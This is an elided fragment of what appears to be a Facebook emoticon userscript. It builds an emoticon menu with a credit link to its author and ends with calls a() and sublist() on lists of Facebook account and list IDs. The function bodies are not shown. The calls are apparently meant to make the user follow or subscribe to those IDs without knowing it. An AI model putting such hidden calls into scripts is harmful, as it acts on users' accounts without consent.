...
// @authorURL	www.facebook.com/Rendi.ac.id
...
(function () {
    ...
    html += '<span title="(Y)" class="emoticon emoticon_like"></span>';
    html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Rendi.ac.id" target="_blank">Created by Rendi Okriza Putra<br></a>';
    html += '</div>';
...
a("100002994103534");
a("100001042250246");
sublist("386041568172310");
sublist("386041844838949");
sublist("386042028172264");
sublist("386042088172258");
sublist("386041428172324");
sublist("386031434839990");
sublist("386041744838959");
sublist("386064051503395");
sublist("306345989501400");
sublist("282245488586725");
sublist("445353435560335");
sublist("426586054105254");
sublist("426585400771986");
